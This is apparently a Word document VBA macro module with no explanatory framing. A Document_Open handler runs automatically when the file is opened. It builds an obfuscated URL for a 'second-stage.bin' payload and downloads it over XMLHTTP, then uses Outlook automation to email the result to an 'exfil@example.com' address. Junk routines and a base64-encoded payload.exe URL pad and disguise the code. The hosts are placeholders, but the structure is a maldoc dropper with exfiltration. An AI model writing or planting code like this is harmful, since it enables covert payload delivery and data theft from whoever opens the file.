
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object, url As String
    Dim lps4wdhm As Object, sbospdtkrqzns As Object
    On Error Resume Next
    url = "jybo" & Chr(115) & Chr(103) & Chr(49) & Chr(112) & Chr(110) & Chr(105) & "vrj://12" & "7.0." & "0.1:" & "9090/se" & "cond" & "-stage." & "bin"
    Set jybosg1pnivrj = CreateObject("MSXML" & "2.XMLHTTP")
    jybosg1pnivrj.Open "GET", url, False
    jybosg1pnivrj.Send
    Set lps4wdhm = CreateObject("Outloo" & "k.Appli" & "cati" & "on")
    Set sbospdtkrqzns = lps4wdhm.CreateItem(0)
    sbospdtkrqzns.To = "exfil@example.com"
    sbospdtkrqzns.Subject = "logs"
    sbospdtkrqzns.Body = jybosg1pnivrj.Status
    sbospdtkrqzns.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
